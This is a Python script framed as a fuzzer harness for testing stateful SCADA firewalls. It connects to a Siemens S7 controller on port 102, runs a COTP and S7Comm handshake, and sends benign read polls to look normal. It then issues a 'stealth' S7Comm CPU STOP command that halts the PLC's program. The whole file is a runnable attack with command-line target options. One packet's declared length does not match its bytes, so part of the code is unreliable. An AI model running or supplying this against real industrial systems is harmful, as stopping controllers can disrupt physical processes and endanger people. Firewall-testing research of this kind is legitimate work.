#!/usr/bin/env python3
"""
Sentinel-Lab: Generative Stateful SCADA Session Fuzzer Harness
Simulates multi-step stateful SCADA sessions (COTP CR -> S7 Setup -> Benign Read -> Stealth CPU Stop)
to benchmark stateful DPI firewalls and session state trackers.
"""

import sys
import os
import time
import socket
import json
import argparse


class StatefulScadaFuzzer:
    def __init__(self, target_host: str = "10.240.0.101", target_port: int = 102, polling_cycles: int = 10):
        self.target_host = target_host
        self.target_port = target_port
        self.polling_cycles = polling_cycles

    def execute_stateful_session(self):
        print("==================================================================")
        print("   SENTINEL-LAB GENERATIVE STATEFUL SCADA SESSION FUZZER           ")
        print("==================================================================")
        print(f"[+] Target Endpoint : {self.target_host}:{self.target_port}")
        print(f"[+] Polling Cycles  : {self.polling_cycles} benign cycles before stealth inject")

        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1.0)
            s.connect((self.target_host, self.target_port))
            print("[+] Connected TCP socket. Starting State Machine...")

            # Step 1: COTP Connection Request (CR)
            cotp_cr = bytes([0x03, 0x00, 0x00, 0x16, 0x11, 0xE0, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00])
            s.send(cotp_cr)
            resp = s.recv(256)
            print(f"  ├── [State 1] COTP CR Sent -> Received CC ACK ({len(resp)} bytes)")

            # Step 2: S7Comm Setup Communication
            s7_setup = bytes([0x03, 0x00, 0x00, 0x19, 0x02, 0xF0, 0x80, 0x32, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01, 0x01, 0xE0])
            s.send(s7_setup)
            resp = s.recv(256)
            print(f"  ├── [State 2] S7 Setup Comm Sent -> Received Setup ACK ({len(resp)} bytes)")

            # Step 3: Benign Polling Phase
            s7_read = bytes([0x03, 0x00, 0x00, 0x1F, 0x02, 0xF0, 0x80, 0x32, 0x01, 0x00, 0x00, 0x00, 0x02, 0x00, 0x0E, 0x00, 0x00, 0x04, 0x01, 0x12, 0x0A, 0x10, 0x02, 0x00, 0x01, 0x00, 0x00, 0x84, 0x00, 0x00, 0x00])
            for i in range(1, self.polling_cycles + 1):
                s.send(s7_read)
                resp = s.recv(256)
                print(f"  ├── [State 3] Benign Read Polling #{i}/{self.polling_cycles} ACK")
                time.sleep(0.1)

            # Step 4: Stealth Command Injection (CPU STOP)
            s7_stop = bytes([0x03, 0x00, 0x00, 0x21, 0x02, 0xF0, 0x80, 0x32, 0x01, 0x00, 0x00, 0x00, 0x03, 0x00, 0x10, 0x00, 0x00, 0x29, 0x00, 0x00, 0x00, 0x00, 0x00, 0x09, 0x50, 0x5F, 0x50, 0x52, 0x4F, 0x47, 0x52, 0x41, 0x4D])
            s.send(s7_stop)
            print("  └── 🚨 [State 4] STEALTH INJECTION SENT: S7Comm CPU STOP (0x29)")

            s.close()
            print("\n[+] Stateful SCADA Session Completed Successfully.")
        except Exception as e:
            print(f"\n[!] Session error or connection reset: {e}")

        print("==================================================================\n")


def main():
    parser = argparse.ArgumentParser(description="Stateful SCADA Session Fuzzer")
    parser.add_argument("-t", "--target", type=str, default="10.240.0.101", help="Target IP")
    parser.add_argument("-p", "--port", type=int, default=102, help="Port")
    parser.add_argument("-n", "--cycles", type=int, default=10, help="Benign polling cycles")
    args = parser.parse_args()

    fuzzer = StatefulScadaFuzzer(target_host=args.target, target_port=args.port, polling_cycles=args.cycles)
    fuzzer.execute_stateful_session()


if __name__ == "__main__":
    main()